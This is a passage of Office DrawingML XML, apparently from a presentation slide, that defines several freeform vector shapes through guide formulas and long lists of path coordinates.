                  <a:lnTo>
                    <a:pt x="47" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="47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7" name="Freeform 78">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12596F8F-8393-478E-8E58-F317A80C16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10806" y="4742069"/>
              <a:ext cx="71895" cy="99725"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 138 w 155"/>
                <a:gd name="T1" fmla="*/ 0 h 215"/>
                <a:gd name="T2" fmla="*/ 138 w 155"/>
                <a:gd name="T3" fmla="*/ 169 h 215"/>
                <a:gd name="T4" fmla="*/ 138 w 155"/>
                <a:gd name="T5" fmla="*/ 192 h 215"/>
                <a:gd name="T6" fmla="*/ 142 w 155"/>
                <a:gd name="T7" fmla="*/ 202 h 215"/>
                <a:gd name="T8" fmla="*/ 145 w 155"/>
                <a:gd name="T9" fmla="*/ 204 h 215"/>
                <a:gd name="T10" fmla="*/ 155 w 155"/>
                <a:gd name="T11" fmla="*/ 212 h 215"/>
                <a:gd name="T12" fmla="*/ 105 w 155"/>
                <a:gd name="T13" fmla="*/ 194 h 215"/>
                <a:gd name="T14" fmla="*/ 95 w 155"/>
                <a:gd name="T15" fmla="*/ 204 h 215"/>
                <a:gd name="T16" fmla="*/ 72 w 155"/>
                <a:gd name="T17" fmla="*/ 214 h 215"/>
                <a:gd name="T18" fmla="*/ 60 w 155"/>
                <a:gd name="T19" fmla="*/ 215 h 215"/>
                <a:gd name="T20" fmla="*/ 37 w 155"/>
                <a:gd name="T21" fmla="*/ 212 h 215"/>
                <a:gd name="T22" fmla="*/ 19 w 155"/>
                <a:gd name="T23" fmla="*/ 198 h 215"/>
                <a:gd name="T24" fmla="*/ 10 w 155"/>
                <a:gd name="T25" fmla="*/ 188 h 215"/>
                <a:gd name="T26" fmla="*/ 2 w 155"/>
                <a:gd name="T27" fmla="*/ 159 h 215"/>
                <a:gd name="T28" fmla="*/ 0 w 155"/>
                <a:gd name="T29" fmla="*/ 142 h 215"/>
                <a:gd name="T30" fmla="*/ 4 w 155"/>
                <a:gd name="T31" fmla="*/ 109 h 215"/>
                <a:gd name="T32" fmla="*/ 17 w 155"/>
                <a:gd name="T33" fmla="*/ 84 h 215"/>
                <a:gd name="T34" fmla="*/ 37 w 155"/>
                <a:gd name="T35" fmla="*/ 66 h 215"/>
                <a:gd name="T36" fmla="*/ 64 w 155"/>
                <a:gd name="T37" fmla="*/ 62 h 215"/>
                <a:gd name="T38" fmla="*/ 76 w 155"/>
                <a:gd name="T39" fmla="*/ 62 h 215"/>
                <a:gd name="T40" fmla="*/ 95 w 155"/>
                <a:gd name="T41" fmla="*/ 70 h 215"/>
                <a:gd name="T42" fmla="*/ 103 w 155"/>
                <a:gd name="T43" fmla="*/ 37 h 215"/>
                <a:gd name="T44" fmla="*/ 103 w 155"/>
                <a:gd name="T45" fmla="*/ 21 h 215"/>
                <a:gd name="T46" fmla="*/ 99 w 155"/>
                <a:gd name="T47" fmla="*/ 14 h 215"/>
                <a:gd name="T48" fmla="*/ 93 w 155"/>
                <a:gd name="T49" fmla="*/ 10 h 215"/>
                <a:gd name="T50" fmla="*/ 81 w 155"/>
                <a:gd name="T51" fmla="*/ 2 h 215"/>
                <a:gd name="T52" fmla="*/ 70 w 155"/>
                <a:gd name="T53" fmla="*/ 68 h 215"/>
                <a:gd name="T54" fmla="*/ 62 w 155"/>
                <a:gd name="T55" fmla="*/ 70 h 215"/>
                <a:gd name="T56" fmla="*/ 50 w 155"/>
                <a:gd name="T57" fmla="*/ 80 h 215"/>
                <a:gd name="T58" fmla="*/ 43 w 155"/>
                <a:gd name="T59" fmla="*/ 97 h 215"/>
                <a:gd name="T60" fmla="*/ 37 w 155"/>
                <a:gd name="T61" fmla="*/ 122 h 215"/>
                <a:gd name="T62" fmla="*/ 37 w 155"/>
                <a:gd name="T63" fmla="*/ 138 h 215"/>
                <a:gd name="T64" fmla="*/ 41 w 155"/>
                <a:gd name="T65" fmla="*/ 173 h 215"/>
                <a:gd name="T66" fmla="*/ 50 w 155"/>
                <a:gd name="T67" fmla="*/ 196 h 215"/>
                <a:gd name="T68" fmla="*/ 54 w 155"/>
                <a:gd name="T69" fmla="*/ 202 h 215"/>
                <a:gd name="T70" fmla="*/ 64 w 155"/>
                <a:gd name="T71" fmla="*/ 206 h 215"/>
                <a:gd name="T72" fmla="*/ 70 w 155"/>
                <a:gd name="T73" fmla="*/ 208 h 215"/>
                <a:gd name="T74" fmla="*/ 83 w 155"/>
                <a:gd name="T75" fmla="*/ 202 h 215"/>
                <a:gd name="T76" fmla="*/ 95 w 155"/>
                <a:gd name="T77" fmla="*/ 188 h 215"/>
                <a:gd name="T78" fmla="*/ 101 w 155"/>
                <a:gd name="T79" fmla="*/ 165 h 215"/>
                <a:gd name="T80" fmla="*/ 103 w 155"/>
                <a:gd name="T81" fmla="*/ 136 h 215"/>
                <a:gd name="T82" fmla="*/ 103 w 155"/>
                <a:gd name="T83" fmla="*/ 120 h 215"/>
                <a:gd name="T84" fmla="*/ 99 w 155"/>
                <a:gd name="T85" fmla="*/ 95 h 215"/>
                <a:gd name="T86" fmla="*/ 91 w 155"/>
                <a:gd name="T87" fmla="*/ 80 h 215"/>
                <a:gd name="T88" fmla="*/ 78 w 155"/>
                <a:gd name="T89" fmla="*/ 70 h 215"/>
                <a:gd name="T90" fmla="*/ 70 w 155"/>
                <a:gd name="T91" fmla="*/ 68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55" h="215">
                  <a:moveTo>
                    <a:pt x="138" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="138" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="140" y="200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="142" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="155" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="107" y="214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105" y="194"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="105" y="194"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="212"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="175"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="159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2" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="84"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="66"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="76" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="66"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="10"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="138" y="0"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="70" y="68"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="70" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46" y="87"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43" y="97"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="39" y="155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45" y="186"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="103" y="120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="85"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="80"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="70" y="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8" name="Freeform 79">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6286EF36-502E-4B15-9559-35062E8621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1049" y="4770827"/>
              <a:ext cx="62618" cy="70967"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 36 w 135"/>
                <a:gd name="T1" fmla="*/ 70 h 153"/>
                <a:gd name="T2" fmla="*/ 40 w 135"/>
                <a:gd name="T3" fmla="*/ 105 h 153"/>
                <a:gd name="T4" fmla="*/ 44 w 135"/>
                <a:gd name="T5" fmla="*/ 115 h 153"/>
                <a:gd name="T6" fmla="*/ 60 w 135"/>
                <a:gd name="T7" fmla="*/ 136 h 153"/>
                <a:gd name="T8" fmla="*/ 81 w 135"/>
                <a:gd name="T9" fmla="*/ 142 h 153"/>
                <a:gd name="T10" fmla="*/ 95 w 135"/>
                <a:gd name="T11" fmla="*/ 140 h 153"/>
                <a:gd name="T12" fmla="*/ 120 w 135"/>
                <a:gd name="T13" fmla="*/ 124 h 153"/>
                <a:gd name="T14" fmla="*/ 135 w 135"/>
                <a:gd name="T15" fmla="*/ 115 h 153"/>
                <a:gd name="T16" fmla="*/ 130 w 135"/>
                <a:gd name="T17" fmla="*/ 124 h 153"/>
                <a:gd name="T18" fmla="*/ 116 w 135"/>
                <a:gd name="T19" fmla="*/ 140 h 153"/>
                <a:gd name="T20" fmla="*/ 102 w 135"/>
                <a:gd name="T21" fmla="*/ 148 h 153"/>
                <a:gd name="T22" fmla="*/ 83 w 135"/>
                <a:gd name="T23" fmla="*/ 153 h 153"/>
                <a:gd name="T24" fmla="*/ 73 w 135"/>
                <a:gd name="T25" fmla="*/ 153 h 153"/>
                <a:gd name="T26" fmla="*/ 42 w 135"/>
                <a:gd name="T27" fmla="*/ 148 h 153"/>
                <a:gd name="T28" fmla="*/ 21 w 135"/>
                <a:gd name="T29" fmla="*/ 132 h 153"/>
                <a:gd name="T30" fmla="*/ 5 w 135"/>
                <a:gd name="T31" fmla="*/ 109 h 153"/>
                <a:gd name="T32" fmla="*/ 0 w 135"/>
                <a:gd name="T33" fmla="*/ 78 h 153"/>
                <a:gd name="T34" fmla="*/ 2 w 135"/>
                <a:gd name="T35" fmla="*/ 60 h 153"/>
                <a:gd name="T36" fmla="*/ 11 w 135"/>
                <a:gd name="T37" fmla="*/ 31 h 153"/>
                <a:gd name="T38" fmla="*/ 31 w 135"/>
                <a:gd name="T39" fmla="*/ 12 h 153"/>
                <a:gd name="T40" fmla="*/ 56 w 135"/>
                <a:gd name="T41" fmla="*/ 0 h 153"/>
                <a:gd name="T42" fmla="*/ 71 w 135"/>
                <a:gd name="T43" fmla="*/ 0 h 153"/>
                <a:gd name="T44" fmla="*/ 91 w 135"/>
                <a:gd name="T45" fmla="*/ 2 h 153"/>
                <a:gd name="T46" fmla="*/ 106 w 135"/>
                <a:gd name="T47" fmla="*/ 8 h 153"/>
                <a:gd name="T48" fmla="*/ 120 w 135"/>
                <a:gd name="T49" fmla="*/ 20 h 153"/>
                <a:gd name="T50" fmla="*/ 128 w 135"/>
                <a:gd name="T51" fmla="*/ 37 h 153"/>
                <a:gd name="T52" fmla="*/ 132 w 135"/>
                <a:gd name="T53" fmla="*/ 51 h 153"/>
                <a:gd name="T54" fmla="*/ 36 w 135"/>
                <a:gd name="T55" fmla="*/ 70 h 153"/>
                <a:gd name="T56" fmla="*/ 99 w 135"/>
                <a:gd name="T57" fmla="*/ 62 h 153"/>
                <a:gd name="T58" fmla="*/ 95 w 135"/>
                <a:gd name="T59" fmla="*/ 27 h 153"/>
                <a:gd name="T60" fmla="*/ 89 w 135"/>
                <a:gd name="T61" fmla="*/ 18 h 153"/>
                <a:gd name="T62" fmla="*/ 77 w 135"/>
                <a:gd name="T63" fmla="*/ 8 h 153"/>
                <a:gd name="T64" fmla="*/ 69 w 135"/>
                <a:gd name="T65" fmla="*/ 6 h 153"/>
                <a:gd name="T66" fmla="*/ 54 w 135"/>
                <a:gd name="T67" fmla="*/ 12 h 153"/>
                <a:gd name="T68" fmla="*/ 42 w 135"/>
                <a:gd name="T69" fmla="*/ 31 h 153"/>
                <a:gd name="T70" fmla="*/ 38 w 135"/>
                <a:gd name="T71" fmla="*/ 45 h 153"/>
                <a:gd name="T72" fmla="*/ 99 w 135"/>
                <a:gd name="T73" fmla="*/ 62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5" h="153">
                  <a:moveTo>
                    <a:pt x="36" y="70"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="36" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="95"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="40" y="105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50" y="126"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="69" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="81" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="108" y="134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="130" y="124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="116" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="102" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="93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2" y="60"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="56" y="0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81" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="106" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="114" y="14"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="124" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="128" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="51"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="134" y="70"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36" y="70"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="99" y="62"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="99" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="97" y="41"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="95" y="27"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="89" y="18"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="83" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="8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62" y="8"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="54" y="12"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="48" y="20"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="31"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="45"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36" y="62"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99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39" name="Freeform 80">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2441458B-0C14-40B4-A184-8F6F83F231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5726" y="4770827"/>
              <a:ext cx="47775" cy="70967"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 11 w 103"/>
                <a:gd name="T1" fmla="*/ 101 h 153"/>
                <a:gd name="T2" fmla="*/ 15 w 103"/>
                <a:gd name="T3" fmla="*/ 117 h 153"/>
                <a:gd name="T4" fmla="*/ 21 w 103"/>
                <a:gd name="T5" fmla="*/ 130 h 153"/>
                <a:gd name="T6" fmla="*/ 35 w 103"/>
                <a:gd name="T7" fmla="*/ 142 h 153"/>
                <a:gd name="T8" fmla="*/ 52 w 103"/>
                <a:gd name="T9" fmla="*/ 148 h 153"/>
                <a:gd name="T10" fmla="*/ 64 w 103"/>
                <a:gd name="T11" fmla="*/ 146 h 153"/>
                <a:gd name="T12" fmla="*/ 77 w 103"/>
                <a:gd name="T13" fmla="*/ 132 h 153"/>
                <a:gd name="T14" fmla="*/ 79 w 103"/>
                <a:gd name="T15" fmla="*/ 122 h 153"/>
                <a:gd name="T16" fmla="*/ 72 w 103"/>
                <a:gd name="T17" fmla="*/ 105 h 153"/>
                <a:gd name="T18" fmla="*/ 41 w 103"/>
                <a:gd name="T19" fmla="*/ 88 h 153"/>
                <a:gd name="T20" fmla="*/ 21 w 103"/>
                <a:gd name="T21" fmla="*/ 78 h 153"/>
                <a:gd name="T22" fmla="*/ 9 w 103"/>
                <a:gd name="T23" fmla="*/ 68 h 153"/>
                <a:gd name="T24" fmla="*/ 2 w 103"/>
                <a:gd name="T25" fmla="*/ 56 h 153"/>
                <a:gd name="T26" fmla="*/ 0 w 103"/>
                <a:gd name="T27" fmla="*/ 43 h 153"/>
                <a:gd name="T28" fmla="*/ 0 w 103"/>
                <a:gd name="T29" fmla="*/ 33 h 153"/>
                <a:gd name="T30" fmla="*/ 8 w 103"/>
                <a:gd name="T31" fmla="*/ 18 h 153"/>
                <a:gd name="T32" fmla="*/ 21 w 103"/>
                <a:gd name="T33" fmla="*/ 6 h 153"/>
                <a:gd name="T34" fmla="*/ 41 w 103"/>
                <a:gd name="T35" fmla="*/ 0 h 153"/>
                <a:gd name="T36" fmla="*/ 52 w 103"/>
                <a:gd name="T37" fmla="*/ 0 h 153"/>
                <a:gd name="T38" fmla="*/ 72 w 103"/>
                <a:gd name="T39" fmla="*/ 2 h 153"/>
                <a:gd name="T40" fmla="*/ 83 w 103"/>
                <a:gd name="T41" fmla="*/ 4 h 153"/>
                <a:gd name="T42" fmla="*/ 97 w 103"/>
                <a:gd name="T43" fmla="*/ 0 h 153"/>
                <a:gd name="T44" fmla="*/ 83 w 103"/>
                <a:gd name="T45" fmla="*/ 49 h 153"/>
                <a:gd name="T46" fmla="*/ 81 w 103"/>
                <a:gd name="T47" fmla="*/ 31 h 153"/>
                <a:gd name="T48" fmla="*/ 74 w 103"/>
                <a:gd name="T49" fmla="*/ 18 h 153"/>
                <a:gd name="T50" fmla="*/ 64 w 103"/>
                <a:gd name="T51" fmla="*/ 8 h 153"/>
                <a:gd name="T52" fmla="*/ 50 w 103"/>
                <a:gd name="T53" fmla="*/ 6 h 153"/>
                <a:gd name="T54" fmla="*/ 41 w 103"/>
                <a:gd name="T55" fmla="*/ 8 h 153"/>
                <a:gd name="T56" fmla="*/ 27 w 103"/>
                <a:gd name="T57" fmla="*/ 20 h 153"/>
                <a:gd name="T58" fmla="*/ 25 w 103"/>
                <a:gd name="T59" fmla="*/ 29 h 153"/>
                <a:gd name="T60" fmla="*/ 27 w 103"/>
                <a:gd name="T61" fmla="*/ 39 h 153"/>
                <a:gd name="T62" fmla="*/ 35 w 103"/>
                <a:gd name="T63" fmla="*/ 47 h 153"/>
                <a:gd name="T64" fmla="*/ 66 w 103"/>
                <a:gd name="T65" fmla="*/ 62 h 153"/>
                <a:gd name="T66" fmla="*/ 83 w 103"/>
                <a:gd name="T67" fmla="*/ 72 h 153"/>
                <a:gd name="T68" fmla="*/ 99 w 103"/>
                <a:gd name="T69" fmla="*/ 88 h 153"/>
                <a:gd name="T70" fmla="*/ 103 w 103"/>
                <a:gd name="T71" fmla="*/ 107 h 153"/>
                <a:gd name="T72" fmla="*/ 103 w 103"/>
                <a:gd name="T73" fmla="*/ 117 h 153"/>
                <a:gd name="T74" fmla="*/ 95 w 103"/>
                <a:gd name="T75" fmla="*/ 134 h 153"/>
                <a:gd name="T76" fmla="*/ 83 w 103"/>
                <a:gd name="T77" fmla="*/ 146 h 153"/>
                <a:gd name="T78" fmla="*/ 64 w 103"/>
                <a:gd name="T79" fmla="*/ 153 h 153"/>
                <a:gd name="T80" fmla="*/ 52 w 103"/>
                <a:gd name="T81" fmla="*/ 153 h 153"/>
                <a:gd name="T82" fmla="*/ 25 w 103"/>
                <a:gd name="T83" fmla="*/ 150 h 153"/>
                <a:gd name="T84" fmla="*/ 13 w 103"/>
                <a:gd name="T85" fmla="*/ 150 h 153"/>
                <a:gd name="T86" fmla="*/ 0 w 103"/>
                <a:gd name="T87" fmla="*/ 152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153">
                  <a:moveTo>
                    <a:pt x="2" y="101"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="130"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="35" y="142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="52" y="148"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="64" y="146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="140"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="79" y="122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="77" y="113"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="72" y="105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="97"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="41" y="88"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="78"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9" y="68"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6" y="64"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="56"/>
                  </a:lnTo>
                  <a:lnTo>
